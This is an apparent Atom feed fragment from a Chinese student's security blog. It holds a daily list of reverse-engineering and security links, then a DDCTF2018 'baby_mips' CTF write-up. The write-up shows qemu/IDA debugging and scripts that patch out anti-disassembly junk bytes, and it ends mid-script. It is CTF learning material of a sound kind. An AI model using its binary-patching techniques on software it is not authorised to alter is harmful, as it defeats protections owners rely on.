babyre WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RCTF2018-babyre-WriteUp&quot;&gt;&lt;a href=&quot;#RCTF2018-babyre-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;RCTF2018 babyre WriteUp&quot;&gt;&lt;/a&gt;RCTF2018 babyre W
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>写在前面的话</title>
    <link href="https://kabeor.github.io/Top/"/>
    <id>https://kabeor.github.io/Top/</id>
    <published>2018-05-18T14:24:59.000Z</published>
    <updated>2018-06-14T04:37:33.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p>一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来</p><h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>先解答一些包括我也很崩溃的问题</p><ol><li>博客为什么加载这么慢，163为什么加载资源失败<blockquote><p>首先我的博客是多图流，图片都是高清或是4K的，我尽量把图片都压缩到500k以下了，js也优化过，是真的尽力了啊。。<br>我侧边栏加了一个网易云音乐的js，如果提示资源加载失败的话，请把代理关了，或者如果不想听歌的话不用管它也行，直接确认好了。<br>然后因为是17届大一，买不起cdn诶，求大佬赞助(偷偷放链接 <a href="http://t.cn/R3YA9gO" target="_blank" rel="noopener">http://t.cn/R3YA9gO</a>)<br>然后其他理由想起来再补充</p></blockquote></li><li>待补充，欢迎提问</li></ol><hr><h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><h3 id="2018-6-14"><a href="#2018-6-14" class="headerlink" title="2018.6.14"></a>2018.6.14</h3><p><strong>深入解析虚拟化</strong><br><a href="https://saferwall.com/blog" target="_blank" rel="noopener">https://saferwall.com/blog</a></p><h3 id="2018-6-13"><a href="#2018-6-13" class="headerlink" title="2018.6.13"></a>2018.6.13</h3><p><strong>栈溢出攻击原理实例详解</strong><br><a href="http://www.purpleroc.com/html/961247.html" target="_blank" rel="noopener">http://www.purpleroc.com/html/961247.html</a></p><h3 id="2018-6-12"><a href="#2018-6-12" class="headerlink" title="2018.6.12"></a>2018.6.12</h3><p><strong>逆向基于 Unity 引擎的 Android 游戏 Temple Run（神庙逃亡）</strong><br><a href="https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one" target="_blank" rel="noopener">https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one</a></p><h3 id="2018-6-11"><a href="#2018-6-11" class="headerlink" title="2018.6.11"></a>2018.6.11</h3><p><strong>C语言实现虚拟机</strong><br><a href="https://felixangell.com/blog/virtual-machine-in-c" target="_blank" rel="noopener">https://felixangell.com/blog/virtual-machine-in-c</a></p><p><strong>C语言实现哈希表</strong><br><a href="https://github.com/jamesroutley/write-a-hash-table" target="_blank" rel="noopener">https://github.com/jamesroutley/write-a-hash-table</a></p><h3 id="2018-6-10"><a href="#2018-6-10" class="headerlink" title="2018.6.10"></a>2018.6.10</h3><p><strong>FC机之超级玛丽简单逆向分析</strong><br><a href="https://bbs.pediy.com/thread-175564.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-175564.htm</a></p><h3 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018.6.9"></a>2018.6.9</h3><p><strong>全球气候可视化</strong><br><a href="https://earth.nullschool.net/" target="_blank" rel="noopener">https://earth.nullschool.net/</a></p><p><strong>图片文字清除插件</strong><br><a href="https://projectnaptha.com/" target="_blank" rel="noopener">https://projectnaptha.com/</a></p><p><strong>一个神奇的手绘公式网站</strong><br><a href="http://webdemo.myscript.com/" target="_blank" rel="noopener">http://webdemo.myscript.com/</a></p><p><strong>电影台词检索网站(英文)</strong><br><a href="http://www.subzin.com/" target="_blank" rel="noopener">http://www.subzin.com/</a></p><h3 id="2018-6-8"><a href="#2018-6-8" class="headerlink" title="2018.6.8"></a>2018.6.8</h3><p><strong>一本面向极客，致力于提高 Mac 工作效率的实用手册 </strong><br><a href="https://bestswifter.gitbook.io/effectivemac/" target="_blank" rel="noopener">https://bestswifter.gitbook.io/effectivemac/</a></p><p><strong>raspberry-pi-os - 使用 Linux 内核和 Raspberry Pi 进行操作系统开发的学习指南</strong><br><a href="https://github.com/s-matyukevich/raspberry-pi-os" target="_blank" rel="noopener">https://github.com/s-matyukevich/raspberry-pi-os</a></p><p><strong>虚拟机保护逆向入门</strong><br><a href="http://t.cn/RB7VCDU" target="_blank" rel="noopener">http://t.cn/RB7VCDU</a></p><h3 id="2018-6-6"><a href="#2018-6-6" class="headerlink" title="2018.6.6"></a>2018.6.6</h3><p>最近忙于复习</p><p><strong>符号执行引擎KLEE</strong><br><a href="http://klee.github.io/" target="_blank" rel="noopener">http://klee.github.io/</a></p><p><a href="https://srg.doc.ic.ac.uk/klee18/schedule.html" target="_blank" rel="noopener">https://srg.doc.ic.ac.uk/klee18/schedule.html</a></p><h3 id="2018-6-2"><a href="#2018-6-2" class="headerlink" title="2018.6.2"></a>2018.6.2</h3><p>复习了几天，今天考完几门，下下星期还得考高数，惆怅</p><p><strong>漫画风讲解DNS over HTTPS</strong><br><a href="https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/" target="_blank" rel="noopener">https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/</a></p><hr><h3 id="2018-5-25-27"><a href="#2018-5-25-27" class="headerlink" title="2018.5.25-27"></a>2018.5.25-27</h3><p>这两天在大佬的带领下参加了川渝赛区的西普杯信息安全铁人三项赛<br>赛题分为数据赛，个人赛和企业赛<br>数据赛为数据流量分析，企业赛为渗透真实企业环境都算是web吧应该<br>个人赛是pwn！pwn！pwn！<br>于是盯了一天的pwn1，是道rop的题，pwn师傅肯定两分钟就做出来了。。作为re菜鸡只能现学现卖，先逆了遍流程(反正也不会pwn)，然后照着网上的资料，用ROPgadget( <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a> )生成了rop利用链，然后copy一个exp，改一改，运行。最后因为经验不足，没有找到真正的溢出长度，于是就很遗憾了(还是因为太菜</p><p>这次比赛给我感触很大，在实际的环境当中要懂的不仅仅是软件自身的保护，还应该了解网络以及软件对用户的保障。在信息安全竞赛中，也应该拓宽自己的知识面，才能灵活应对。</p><p>就写这么多吧，还是挺开心的</p><hr><h3 id="2018-5-24"><a href="#2018-5-24" class="headerlink" title="2018.5.24"></a>2018.5.24</h3><p>Miasm的博客，研究<strong>动态符号执行</strong><br><a href="http://www.miasm.re/blog/index.html" target="_blank" rel="noopener">http://www.miasm.re/blog/index.html</a></p><p><strong>The Legend of Random的系列教程</strong><br><a href="https://legend.octopuslabs.io/index.html" target="_blank" rel="noopener">https://legend.octopuslabs.io/index.html</a></p><hr><h3 id="2018-5-23"><a href="#2018-5-23" class="headerlink" title="2018.5.23"></a>2018.5.23</h3><p>今天做完了那天的题，写了wp</p><p>Dwarf Fortress真的很有意思，找到一个很易懂的教程 <a href="https://df-walkthrough.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://df-walkthrough.readthedocs.io/en/latest/</a></p><p><strong>理解与分析 ELF 二进制文件格式</strong><br> <a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>使用 IDA Pro 和 x64dbg 逆向分析 Gootkit 恶意软件</strong><br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=242Tn0IL2jE</a></p><hr><h3 id="2018-5-22"><a href="#2018-5-22" class="headerlink" title="2018.5.22"></a>2018.5.22</h3><p>看到一个<strong>IDA快捷键的总结</strong> <a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/IDA/IDA_Pro_Shortcuts.pdf</a></p><p><strong>GDB基本命令</strong><br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Reverse_Engineering/gdb/GDB%20Cheat%20Sheet.pdf</a></p><p><strong>CTF知识合集</strong><br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>一个著名的游戏<strong>Dwarf Fortress</strong><br><a href="http://www.bay12games.com/dwarves/index.html" target="_blank" rel="noopener">http://www.bay12games.com/dwarves/index.html</a></p><hr><h3 id="2018-5-21"><a href="#2018-5-21" class="headerlink" title="2018.5.21"></a>2018.5.21</h3><p>早上五点被热醒。。。学校半夜断电，开不了空调，差评<br>开电脑继续看昨天的题，进展很大，在让栈指针平衡后，IDA可以F5了，瞬间很好理解，但是算法太复杂了，学习了gdb动态调试，的确是非常强大的工具。</p><p>还是没做出来，很难受<br>晚上看了一个很棒的CTF总结 <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/</a></p><hr><h3 id="2018-5-20"><a href="#2018-5-20" class="headerlink" title="2018.5.20"></a>2018.5.20</h3><p>本来准备“好好学英语”，结果实验室来了场练习赛<br>逆向是一道Linux的，压缩包里给了一个二进制文件和一个名为“out”的文件，里面是几行十六进制之类的，总感觉这个题给的形式在哪儿见过，但是想不起来了。F5不能分析，看看图形化分析，算法很复杂，想用angr，但存在alarm函数，angr脚本运行不了，毫无思路，感觉最近很浮躁</p><p>晚上边看英语边看RNG。。。</p><hr><h3 id="2018-5-19"><a href="#2018-5-19" class="headerlink" title="2018.5.19"></a>2018.5.19</h3><p>一整天又是实验课又是ACM比赛，晚上九点多才好好吃了顿饭。<br>打ACM太菜了，没算法没数据没脑洞，有几道题好不容易输出符合，还不给AC。。。还是滚回来看逆向好了(虽说也很菜)</p><hr><h3 id="2018-5-18"><a href="#2018-5-18" class="headerlink" title="2018.5.18"></a>2018.5.18</h3><p>今天就把前几天的也记上吧</p><h4 id="1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化"><a href="#1-打造个性超赞博客Hexo-NexT-GithubPages的超深度优化" class="headerlink" title="1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化"></a>1.打造个性超赞博客Hexo+NexT+GithubPages的超深度优化</h4><p>这篇文章加里面的链接可以说是优化博客非常全的一篇文章了</p><blockquote><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a></p></blockquote><h4 id="2-一个假装是死循环的有限循环"><a href="#2-一个假装是死循环的有限循环" class="headerlink" title="2.一个假装是死循环的有限循环"></a>2.一个假装是死循环的有限循环</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(int i=1; i&lt;0; i++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;我不是死循环&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理: 明天写。。。</p><h4 id="3-IDA-技巧-处理动态导入"><a href="#3-IDA-技巧-处理动态导入" class="headerlink" title="3.IDA 技巧-处理动态导入"></a>3.IDA 技巧-处理动态导入</h4><blockquote><p><a href="https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports" target="_blank" rel="noopener">https://www.usualsuspect.re/article/ida-tricks-handling-dynamic-imports</a></p></blockquote><h4 id="4-逆向-Path-of-Exile-游戏系列"><a href="#4-逆向-Path-of-Exile-游戏系列" class="headerlink" title="4.逆向 Path of Exile 游戏系列"></a>4.逆向 Path of Exile 游戏系列</h4><blockquote><p>Part 1： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile.html</a><br>Part 2： <a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile_0.html</a><br>Part 3：<a href="http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html" target="_blank" rel="noopener">http://tbinarii.blogspot.in/2018/05/reverse-engineering-path-of-exile-game.html</a></p></blockquote><h4 id="5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947"><a href="#5-Adobe-Acrobat-Reader-DC-远程代码执行漏洞详情披露-CVE-2018-4996、CVE-2018-4947" class="headerlink" title="5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)"></a>5.Adobe Acrobat Reader DC 远程代码执行漏洞详情披露(CVE-2018-4996、CVE-2018-4947)</h4><blockquote><p><a href="https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2018/05/multiple-acrobat-reader-vulns.html</a></p></blockquote><p>From <a href="https://kabeor.github.io/Top/">https://kabeor.github.io/Top/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h1&gt;&lt;p&gt;一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来&lt;/p&gt;
&lt;h2 id=&quot;Issue&quot;&gt;&lt;a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DDCTF2018 Reverse writeup(1) baby_mips</title>
    <link href="https://kabeor.github.io/DDCTF2018%20Reverse%20writeup(1)%20baby_mips/"/>
    <id>https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</id>
    <published>2018-05-15T04:07:53.287Z</published>
    <updated>2018-06-07T11:11:17.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-Reverse-writeup"><a href="#DDCTF2018-Reverse-writeup" class="headerlink" title="DDCTF2018 Reverse writeup"></a>DDCTF2018 Reverse writeup</h1><h2 id="baby-mips"><a href="#baby-mips" class="headerlink" title="baby_mips"></a>baby_mips</h2><p>花了一天，终于写完了</p><p>这是一道mips指令集的逆向题。<br>关于mips架构  <a href="https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/MIPS%E6%9E%B6%E6%A7%8B</a></p><h3 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h3><p>在ubuntu运行<br><code>./baby_mips</code></p><p>会让输入16个值,然后提示非法指令<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/3jCFAkId7b.png?imageslim" alt="mark"></p><p>在IDA中分析一下</p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>进入IDA首先就是搜索字符串<br>显而易见<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/6aCCCDgH6C.png?imageslim" alt="mark"><br>图形化分析这里<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/FE89H5Fff5.png?imageslim" alt="mark"><br>可以看出是一个简单的条件判断</p><p>如果你以为F5看算法写脚本就结束，那就too native了</p><h3 id="使用qemu模拟器动态调试"><a href="#使用qemu模拟器动态调试" class="headerlink" title="使用qemu模拟器动态调试"></a>使用qemu模拟器动态调试</h3><p>baby_mips是MIPS指令集上的程序，IDA只能静态分析，不能debug。采取的方法是在linux机上安装qemu模拟器，利用qemu来运行MIPS指令程序。</p><p>因此，首先当然是在ubuntu上安装qemu模拟器了<br><code>sudo apt-get install qemu</code><br>就可以了</p><p>qemu可以模拟很多指令集<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/KbImJBIaBm.png?imageslim" alt="mark"></p><p><strong>关于用法，最简单的</strong><br><code>qemu-你需要的指令集 文件名</code></p><p><strong>如果要利用IDA调试(IDA远程调试)</strong><br><code>qemu-你需要的指令集 -g 端口 文件名</code><br>原理：qemu -g port指令开启一个gdbserver。port另一端可以由IDA或gdb连接调试。</p><p>运行以后在IDA<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/4I198haF06.png?imageslim" alt="mark"><br>选GDB调试，点左边绿色的RUN<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/D0CKIgb5cI.png?imageslim" alt="mark"><br>确定<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/Ajf6c7I20f.png?imageslim" alt="mark"><br>确定<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/i27718dAdf.png?imageslim" alt="mark"></p><p>下面我们需要输入的是Hostname和Port，如果你是在运行qemu的系统里运行IDA，Hostname就填127.0.0.1，要是别的系统，比如你用的是虚拟机，就填运行qume的系统的IP,Port就填刚刚qemu里设置好的就行。(这些是常识了)</p><p>然后确认IDA就可以动态调试了</p><p>经过尝试，这里的baby_mips是mips小字端程序，所以我们运行指令<br><code>qemu-mipsel -g 6666 baby_mips</code><br>然后IDA点确定<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/k493klJHlI.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/LA4dJJFLK3.png?imageslim" alt="mark"><br>成功了</p><p>我们运行程序，输入16个数，弹出一个错<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/Agj7E7C7GG.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/m6e71HiKjh.png?imageslim" alt="mark"></p><p>程序停在了00400430，并且这里的指令是以EB02开头的</p><p>往下翻翻，发现非常多的EB02，然后下面的指令就不被识别了</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180514/7IDiifdG5e.png?imageslim" alt="mark"></p><p>IDA有一个强大的插件</p><blockquote><p>keypatch —–<a href="http://www.keystone-engine.org/keypatch/" target="_blank" rel="noopener">http://www.keystone-engine.org/keypatch/</a></p></blockquote><p>可以用这个插件把第一个EB02 NOP ，然后运行的话会发现又在下一个EB02报错，所以应该就是EB02的问题了</p><p>至于原理，参阅了很多篇wp，大概就是</p><blockquote><p>查找lwc1指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到$f29和$t1寄存器的内容</p><p>指令的头两个字节为 \xEB\x02 ，且在x86指令集中 \xEB 为跳转指令。</p><p>把操作码反汇编成汇编代码后发现第一条指令是 jmp 0x4 ，刚好MIPS指令集每条指令大小为4字节。</p><p>猜测程序让我们遇到这个指令就跳转四字节</p></blockquote><p>于是现在的思路就是将所有EB02开头的指令nop</p><p>由于MIPS指令是定长的，均为4个字节。因此，可以在选定的代码块中，将所有以EB 02开始的4字节数据全部替换成00 00 00 00，在MIPS指令中，nop对应的机器码为00 00 00 00</p><p>需要固定监测指令的头部，是因为可能会误清除掉正常指令</p><h3 id="使用脚本去除EB02指令"><a href="#使用脚本去除EB02指令" class="headerlink" title="使用脚本去除EB02指令"></a>使用脚本去除EB02指令</h3><p>下面是各位大佬写的IDC或IDPython脚本，功能都是去除EB02指令</p><hr><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static matchBytes(StartAddr, Match) </span><br><span class="line">&#123; </span><br><span class="line">    auto Len, i, PatSub, SrcSub; </span><br><span class="line">    Len = strlen(Match);</span><br><span class="line"></span><br><span class="line">    while (i &lt; Len) </span><br><span class="line">    &#123; </span><br><span class="line">       PatSub = substr(Match, i, i+1); </span><br><span class="line">       SrcSub = form(&quot;%02X&quot;, Byte(StartAddr)); </span><br><span class="line">       SrcSub = substr(SrcSub, i % 2, (i % 2) + 1); </span><br><span class="line"></span><br><span class="line">       if (PatSub != &quot;?&quot; &amp;&amp; PatSub != SrcSub) </span><br><span class="line">       &#123; </span><br><span class="line">        return 0; </span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">       if (i % 2 == 1) </span><br><span class="line">       &#123; </span><br><span class="line">        StartAddr++; </span><br><span class="line">       &#125; </span><br><span class="line">       i++; </span><br><span class="line">    &#125;</span><br><span class="line">    return 1; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static main() </span><br><span class="line">&#123; </span><br><span class="line">   auto StartVa, SavedStartVa, StopVa, Size, i, j;</span><br><span class="line"></span><br><span class="line">    StartVa = 0x400420; </span><br><span class="line">    StopVa = 0x403233;</span><br><span class="line"></span><br><span class="line">    Size = StopVa - StartVa; </span><br><span class="line">    SavedStartVa = StartVa;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; Size/4; i++) </span><br><span class="line">    &#123; </span><br><span class="line">       if (matchBytes(StartVa, &quot;EB02????&quot;)) </span><br><span class="line">       &#123; </span><br><span class="line">            Message(&quot;Find%x:%02x%02x%02x%02x\n&quot;, StartVa,Byte(StartVa),Byte(StartVa+1),Byte(StartVa+2),Byte(StartVa+3));</span><br><span class="line">            for (j = 0; j &lt; 4; j++) </span><br><span class="line">            &#123; </span><br><span class="line"></span><br><span class="line">                 PatchByte(StartVa, 0x00); </span><br><span class="line">                 MakeCode(StartVa); </span><br><span class="line">                 StartVa++; </span><br><span class="line">            &#125; </span><br><span class="line">       &#125; </span><br><span class="line">        else</span><br><span class="line">            StartVa=StartVa+4; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnalyzeArea(SavedStartVa, StopVa); </span><br><span class="line">    Message(&quot;Clear eb02 Opcode Ok &quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>来自‘逢魔安全实验室’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">f = open(&quot;baby_mips&quot;, &quot;rb&quot;)</span><br><span class="line">content = f.read()</span><br><span class="line">content = list(content)</span><br><span class="line">for x in range(0, len(content)):</span><br><span class="line">    if content[x] == &quot;\xeb&quot; and content[x+1] == &quot;\x02&quot; and (x%4==0):</span><br><span class="line">        content[x] = &quot;\x00&quot;</span><br><span class="line">        content[x+1] = &quot;\x00&quot;</span><br><span class="line">        content[x+2] = &quot;\x00&quot;</span><br><span class="line">        content[x+3] = &quot;\x00&quot;</span><br><span class="line">content = &quot;&quot;.join(content)</span><br><span class="line">p = open(&quot;patch&quot;, &quot;wb&quot;)</span><br><span class="line">p.write(content)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import idautils</span><br><span class="line">import idc</span><br><span class="line">import idaapi</span><br><span class="line"></span><br><span class="line">start_addr = 0x400420</span><br><span class="line">end_addr = 0x403234</span><br><span class="line">while start_addr &lt;= end_addr:</span><br><span class="line">    if Byte(start_addr) == 0xeb and Byte(start_addr +1) == 0x2:</span><br><span class="line">        PatchByte(start_addr,0x00)</span><br><span class="line">        PatchByte(start_addr+1,0x00)</span><br><span class="line">        PatchByte(start_addr+2,0x00)</span><br><span class="line">        PatchByte(start_addr+3,0x00)</span><br><span class="line">    start_addr += 4</span><br></pre></td></tr></table></figure><hr><p>选择上述其中一个脚本，在桌面保存成一个.py或.idc文件<br>选择File-&gt;Script file或Script command</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/aIGC2D5Ald.png?imageslim" alt="mark"></p><p>然后import导入或直接写也可以，然后RUN<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/lLDLkGkgK2.png?imageslim" alt="mark"></p><p>关闭这个窗口，会有一个提示是否保存修改，点击Yes，这时桌面会生成一个patch<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/jLim7l1chE.png?imageslim" alt="mark"></p><p>IDA载入这个patch，可以发现在ubuntu下的IDA里指令都可以被识别，而且可以运行，我在win10运行的IDA会有几个小段不能识别，需要手动改为指令，将0x400420处的代码转换成函数</p><h3 id="将数据转为代码和函数"><a href="#将数据转为代码和函数" class="headerlink" title="将数据转为代码和函数"></a>将数据转为代码和函数</h3><p>首先往下看看，有几段没有识别的<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/DiLhA1diE2.png?imageslim" alt="mark"><br>把它们全部选中(00401A58-00401F28)，右键,选择Analyze selected area或按C，<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/8J7bA6aeeC.png?imageslim" alt="mark"><br>选Analyze，然后Yes，然后就会变成代码<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/9JAcGEh7e6.png?imageslim" alt="mark"><br>当然这还没完，函数头部00400420没有变量声明，识别出来的肯定是错误的函数，因此在00400420右键，选择Create function<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/fhK87Bk28c.png?imageslim" alt="mark"><br>就可以了<br>然后图形化分析就像下面那样</p><p><strong>记得保存修改，路径Edit-&gt;Patch program-&gt;Apply patches input file</strong></p><blockquote><p><strong>标准转换方式</strong></p><p>1.<em>函数和数据互换</em></p><p>在重新格式化之前，首先必须删除其当前的格式（代码或数据）。右击你希望取消定义的项目，在结果上下文菜单中选择Undefine（也可使用Edit▶Undefine命令或热键U），即可取消函数、代码或数据的定义</p><p>转换成code后，此时不能使用图形view<br>创建函数（Edit—&gt;Functions—&gt;Create Function….）就可以了</p><p>2.<em>代码和数据转换</em></p><p>通过Edit▶Data和热键D来完成,之后使用Undefine<br>之后使用code指令</p></blockquote><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><h4 id="1-反编译器分析"><a href="#1-反编译器分析" class="headerlink" title="1.反编译器分析"></a>1.反编译器分析</h4><p>用图形化分析sub_400420这个函数<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/dagagE3i4i.png?imageslim" alt="mark"><br>一共十六个条件，必须每条都得满足才行</p><p>IDA的F5不能用，我们需要能够分析MIPS的反编译器<br>· <strong>Retdec</strong>     <a href="https://github.com/avast-tl/retdec" target="_blank" rel="noopener">https://github.com/avast-tl/retdec</a><br>· <strong>JEB-MIPS</strong>   <a href="https://www.pnfsoftware.com/jeb/demomips" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb/demomips</a></p><p>下面是三种找出算法的方法</p><h5 id="1-Retdec"><a href="#1-Retdec" class="headerlink" title="1.Retdec"></a>1.Retdec</h5><p>RetDec 是一个可重定向的机器码反编译器，它基于 LLVM，支持各种体系结构、操作系统和文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX 和原始机器码。<br>支持的体系结构（仅限 32 位）：Intel x86，ARM，MIPS，PIC32 和 PowerPC。</p><p>安装和使用方法GitHub上都写了<br>或者这里有一个很好的简易介绍  <a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/5.11.1_retdec.html</a></p><p>我在win10安装之后，把patch放到了D盘根目录，Retdec文件夹也是，然后在cmd中执行<br><code>D:\retdec\bin\decompile.sh D:\patch</code><br>等待分析(因为我装了Git，就自动调用Git bash执行了，其他情况还没试过)<br>结束后D盘生成下面几个文件<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/4gmjFC6jg6.png?imageslim" alt="mark"><br>打开patch.c，看sub_400420<br>我的不知道出了什么问题，分析不了，直接return 1。。。感觉应该是把函数分解了</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/GGbahldljI.png?imageslim" alt="mark"></p><p>借用一下‘niuwuwu’的图<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/h42dDgAiId.png?imageslim" alt="mark"></p><p>是16个方程求解，解方程下面说，接下来用JEB反编译</p><h5 id="2-JEB-MIPS"><a href="#2-JEB-MIPS" class="headerlink" title="2.JEB-MIPS"></a>2.JEB-MIPS</h5><p>先到官网下载试用版的JEB，试用版功能是完整版的百分之九十，所以其实足够学习用了(国外友人客服也非常专业且友好)</p><p>解压后有三个运行脚本，分别是Windows，Linux和Mac OS的，我为了方便就装Ubuntu了</p><p><strong>不管是哪个系统，我们都需要JAVA8的环境</strong></p><p>Ubuntu安装JAVA8<br><code>sudo apt-get install openjdk-8-jdk</code><br>查看java版本，看看是否安装成功<br><code>java -version</code></p><p>成功后运行脚本，就打开主程序了，导入patch程序，找到00400420<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/dI5h8L0m58.png?imageslim" alt="mark"><br>右键，Decompile<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/54G3cEe46I.png?imageslim" alt="mark"><br>很长很长的算式，就是16个方程了</p><h4 id="2-手工分析清洗方程"><a href="#2-手工分析清洗方程" class="headerlink" title="2.手工分析清洗方程"></a>2.手工分析清洗方程</h4><p>(来自‘奈沙夜影’)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f = open(&quot;code.txt&quot;, &quot;r&quot;)</span><br><span class="line">flower = [&quot;slti&quot;, &quot;sdc1&quot;]</span><br><span class="line">a0 = 0x76ff270</span><br><span class="line">v0 = 0xd0000</span><br><span class="line">v1 = 8</span><br><span class="line">fp = [0 for i in range(0x500)]</span><br><span class="line">table = [0x0, 